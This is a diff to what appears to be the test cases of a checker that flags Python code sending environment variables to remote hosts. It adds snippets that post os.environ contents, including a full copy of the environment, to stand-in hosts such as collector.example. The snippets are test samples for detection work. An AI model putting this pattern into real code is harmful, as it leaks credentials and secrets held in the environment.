@@ -63,6 +63,12 @@ ONE_SETTING = {
         url = E("SERVICE_URL") or "https://example.org/models"
         urllib.request.urlopen(url, timeout=E("SERVICE_TIMEOUT") or 10)
     """,
+    "a default chosen by a membership test (c2cciutils' and Finance-Ultron's shape)": """
+        import os, json, requests
+        url = "https://example.org/data" if "DATA_URL" not in os.environ else os.environ["DATA_URL"]
+        user = os.environ["SVC_USER"] if "SVC_USER" in os.environ else "anon"
+        requests.post(url, data=json.dumps({"user": user}))
+    """,
     "membership on an alias": """
         import os, requests
         env = os.environ
@@ -224,6 +230,11 @@ WHOLE = {
         import os, requests
         items = os.environ.items
         requests.post("https://collector.example/x", json=dict(items()))
+    """,
+    "an if-expression whose branch is the environment, chosen by a membership test": """
+        import os, requests
+        body = os.environ.copy() if "CI" in os.environ else {}
+        requests.post("https://collector.example/x", json=body)
     """,
     "a membership result written straight into the body": """
         import os, requests
